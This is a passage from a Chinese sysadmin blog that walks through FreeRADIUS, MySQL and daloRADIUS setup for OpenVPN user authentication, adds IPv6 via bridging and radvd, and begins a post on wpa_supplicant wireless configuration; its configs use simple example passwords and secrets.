     exec</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        expr</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        expiration</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        logintime</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$INCLUDE policy.conf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$INCLUDE sites-enabled/</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>vi clients.conf</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">client localhost {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        ipaddr = 127.0.0.1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        secret          = testpw</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        require_message_authenticator = no</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">client 192.168.0.2 {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        ipaddr = 192.168.0.2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        secret          = testpw</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        require_message_authenticator = no</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>vi sites-enabled/default</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">authorize {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        preprocess</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        chap</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        mschap</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        digest</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        suffix</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        eap {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                ok = return</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        sql</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        expiration</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        logintime</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        pap</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">authenticate {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Auth-Type PAP {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                pap</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Auth-Type CHAP {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                chap</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Auth-Type MS-CHAP {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                mschap</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        digest</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        unix</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        eap</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">preacct {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        preprocess</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        acct_unique</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        suffix</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        files</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">accounting {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        detail</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        radutmp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        sql</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        exec</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        attr_filter.accounting_response</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">session {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        radutmp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">post-auth {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        exec</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Post-Auth-Type REJECT {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                attr_filter.access_reject</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">post-proxy {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        eap</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>vi  sql.conf</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">sql {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        database = &quot;mysql&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        driver = &quot;rlm_sql_${database}&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        server = &quot;localhost&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        port = 3306</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        login = &quot;radius&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        password = &quot;radpass&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        radius_db = &quot;radius&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        acct_table1 = &quot;radacct&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        acct_table2 = &quot;radacct&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        postauth_table = &quot;radpostauth&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        authcheck_table = &quot;radcheck&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        authreply_table = &quot;radreply&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        groupcheck_table = &quot;radgroupcheck&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        groupreply_table = &quot;radgroupreply&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        usergroup_table = &quot;radusergroup&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        deletestalesessions = yes</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        sqltrace = no</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        sqltracefile = ${logdir}/sqltrace.sql</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        num_sql_socks = 5</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        connect_failure_retry_delay = 60</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        lifetime = 0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        max_queries = 0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        readclients = yes</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        nas_table = &quot;nas&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        $INCLUDE sql/${database}/dialup.conf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>启动radius： <code>radiusd  &amp;</code></p><p>安装phpmyadmin管理mysql</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">tar xf phpMyAdmin-2.11.11.3-all-languages.tar.gz -C /var/www/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mv /var/www/phpMyadmin* /var/www/phpmyadmin &amp;&amp; cd /var/www/phpmyadmin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cp config.sample.inc.php config.inc.php</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">vi config.inc.php 修改以下</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$cfg[&#x27;blowfish_secret&#x27;] = &#x27;ADKFdkfjdl959435dfkds^%&amp;&#x27;;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>安装daloradius管理freeradius</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">tar xf daloradius-0.9-9-rc1.tar.gz -C /var/www/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cd /var/www</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mv daloradius* daloradius</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cd /var/www/daloradius/contrib/db</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Mysql -uroot -p radius &lt; mysql-daloradius.sql</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Mysql -uroot -p radius &lt; fr2-mysql-daloradius-and-freeradius.sql</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">chown apache:apache /var/www/daloradius -R</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">chmod 644 /var/www/daloradius/library/daloradius.conf .php#配置文件需要给予写权限</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>vi /var/www/daloradius/library/daloradius.conf.php</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$configValues[&#x27;CONFIG_DB_ENGINE&#x27;] = &#x27;mysql&#x27;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$configValues[&#x27;CONFIG_DB_HOST&#x27;] = &#x27;localhost&#x27;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$configValues[&#x27;CONFIG_DB_USER&#x27;] = &#x27;radiusadmin&#x27;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$configValues[&#x27;CONFIG_DB_PASS&#x27;] = &#x27;radiusadmin&#x27;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$configValues[&#x27;CONFIG_DB_NAME&#x27;] = &#x27;radius&#x27;;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>此处的radiusadmin账号是在phpmyadmin里创建的并给予radius库相应操作权限；</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">touch /tmp/daloradius.log</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">chown apache.apache /tmp/daloradius.log</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>vi /etc/httpd/conf/httpd.conf</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Alias /radius &quot;/var/www/daloradius/&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt;Directory /var/www/daloradius/&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      Options None</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      order deny,allow</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      deny from all</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      allow from 127.0.0.1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      allow from 192.168.0.0/24</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt;/Directory&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Alias /phpmyadmin &quot;/var/www/phpmyadmin/&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt;Directory /var/www/phpmyadmin/&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      Options None</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      order deny,allow</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      deny from all</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      allow from 127.0.0.1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      allow from 192.168.0.0/24</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   &lt;/Directory&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>启动apache  <code>/etc/init.d/httpd restart</code></p><p>访问 <a href="http://192.168.0.2/radius" target="_blank" rel="noopener noreferrer">http://192.168.0.2/radius</a></p><p>username: administrator, password: radius</p><p>在用户管理里面添加一个账号，即可用这个账号进行认证登陆。</p><p>windows客户端下载：<a href="http://swupdate.openvpn.net/community/releases/openvpn-2.2.0-install.exe" target="_blank" rel="noopener noreferrer">http://swupdate.openvpn.net/community/releases/openvpn-2.2.0-install.exe</a></p><p>修改配置文件X:\Program Files\OpenVPN\config\client.ovpn</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">client</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">dev tap</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">proto udp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">remote 192.168.0.2 1194</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">;remote-random</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">resolv-retry infinite</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nobind</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">persist-key</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">persist-tun</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ca ca.crt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">auth-user-pass</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ns-cert-type server</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">;tls-auth ta.key 0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">comp-lzo</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">verb 3</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>同时将服务器端的ca.crt拷贝到X:\Program Files\OpenVPN\config\  目录下。
win7需要以管理员身份运行OpenVPN GUI ，使用daloradius里添加的账号密码登陆。</p><p>添加ipv6支持：</p><p>让openvpn客户端支持Ipv6网络，需要将openvpn使用的虚拟网卡与具有ipv6地址的物理网卡进行桥接，让openvpn监听在此桥接的虚拟网卡上，然后通过自动DHCP实现为客户端分配ipv6地址。</p><p>安装配置网卡桥接：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">yum  install bridge-utils</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>编辑bridge-start启动脚本，根据系统网络设备对应编辑。</p><p>下载radvd：<a href="http://www.litech.org/radvd/dist/radvd-1.8.tar.gz" target="_blank" rel="noopener noreferrer">http://www.litech.org/radvd/dist/radvd-1.8.tar.gz</a></p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">tar  xf radvd-* &amp;&amp; cd radvd-*</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">./configure --sysconfdir=/etc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">make &amp;&amp; make install</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>修改配置文件 vi /etc/radvd.conf</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">interface br0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">{</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    AdvSendAdvert on;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    MinRtrAdvInterval 3;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    MaxRtrAdvInterval 10;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    AdvDefaultPreference low;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    prefix 2001:250:1002:40::/64 //客户端IPv6前缀</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        AdvOnLink on;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        AdvAutonomous on;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        AdvRouterAddr on;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    };</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">};</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>参考文档：</p><p><a href="http://howtoforge.org/authentication-authorization-and-accounting-with-freeradius-and-mysql-backend-and-webbased-management-with-daloradius" target="_blank" rel="noopener noreferrer">Authentication, Authorization &amp; Accounting with FreeRadius &amp; MySQL backend &amp; web based Management with Daloradius</a></p></div><footer class="row docusaurus-mt-lg"><div class="col"><b>标签：</b><ul class="tags_jXut padding--none margin-left--sm"><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/notes/blog/tags/openvpn">openvpn</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/notes/blog/tags/freeradius">freeradius</a></li></ul></div></footer></article><article class="margin-bottom--xl" itemprop="blogPost" itemscope="" itemtype="http://schema.org/BlogPosting"><header><h2 class="title_f1Hy" itemprop="headline"><a itemprop="url" href="/notes/blog/2011/05/05/centos-wpa-supplicant-wireless">使用wpa-supplicant配置无线网络</a></h2><div class="container_mt6G margin-vert--md"><time datetime="2011-05-05T00:00:00.000Z" itemprop="datePublished">2011年5月5日</time> · <!-- -->阅读需 3 分钟</div></header><div class="markdown" itemprop="articleBody"><blockquote><p>之前在使用桌面的过程中，发现如果需要连接无线网 ， 那么networkmanager是首选的，自动管理网卡，自动扫描信号，用起来各种舒服；但是突然有一天发现networkmanager干了某些我不期望它干的事情，于是果断yum remove之，由于一气之下remove掉了networkmanager，并没有考虑到还得用它来连接无线，导致后来发现需要连无线的时候极为不方便，最终发现可以使用wpa-supplicant来管理无线网络连接。</p></blockquote><ul><li>Kramdown table of contents
{:toc .toc}</li></ul><p>其实很多人都推荐用这个了wpa_supplicant，但是由于一直没有这个必要所以就一直没有学会使用，今天用了下感觉还真不错。 wpa_supplicant首先在/etc/init.d/wpa_supplicant 有一个启动控制脚本，然后有/etc/wpa_supplicant/wpa_supplicant.conf这个默认配置文件，还有一个/etc/sysconfig/wpa_supplicant的全局配置文件，</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="安装">安装<a class="hash-link" href="#安装" title="标题的直接链接">​</a></h3><p>使用yum安装：<code>yum install wpa_supplicant</code>，在/usr/share/doc下有大量的配置示例和文档，</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="配置">配置<a class="hash-link" href="#配置" title="标题的直接链接">​</a></h3><p>在使用它之前需要修改几个配置文件，首先是wpa_supplicant.conf  ,比如我的配置如下:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># cat /etc/wpa_supplicant/wpa_supplicant.conf</span><br></span><span class="token-line" 